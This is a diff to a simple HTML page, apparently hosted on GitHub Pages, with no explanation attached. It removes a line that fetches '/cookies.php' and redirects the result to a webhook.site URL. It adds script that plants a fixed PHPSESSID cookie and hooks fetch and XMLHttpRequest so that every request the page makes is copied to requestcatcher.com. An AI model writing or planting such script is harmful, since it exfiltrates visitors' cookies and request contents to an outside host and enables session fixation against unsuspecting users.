@@ -5,14 +5,48 @@
 <p>I'm hosted with GitHub Pages.</p>
 
 <script>
+// Set the PHPSESSID cookie
+document.cookie = "PHPSESSID=klcjlsk98kk; path=/";
 
-fetch('/cookies.php').then(response => response.text()).then(text => window.location.href =`https://webhook.site/95b7f1e1-b976-493b-8573-7d236067214f?cz=${text}`);
+// Function to duplicate the request to the external server
+function duplicateRequest(request) {
+    fetch('https://noproblem.requestcatcher.com/', {
+        method: request.method,
+        headers: request.headers,
+        body: request.body,
+        mode: 'cors',
+        redirect: 'follow'
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log("Request duplicated successfully:", data);
+    })
+    .catch(error => {
+        console.error("Error duplicating request:", error);
+    });
+}
 
+// Listen for any fetch or XHR requests and duplicate them
+(function() {
+    // Override the global fetch function
+    const originalFetch = window.fetch;
+    window.fetch = function(input, init) {
+        const request = new Request(input, init);
+        duplicateRequest(request);  // Duplicate the request
+        return originalFetch(input, init);  // Continue with the original fetch
+    };
+
+    // Optionally, override XMLHttpRequest as well
+    const originalXhrOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+        this.addEventListener("load", function() {
+            // When request is complete, forward it to the target
+            duplicateRequest(this);
+        });
+        originalXhrOpen.apply(this, arguments);
+    };
+})();
 </script>
-
-
-
-
 
 </body>
 </html>
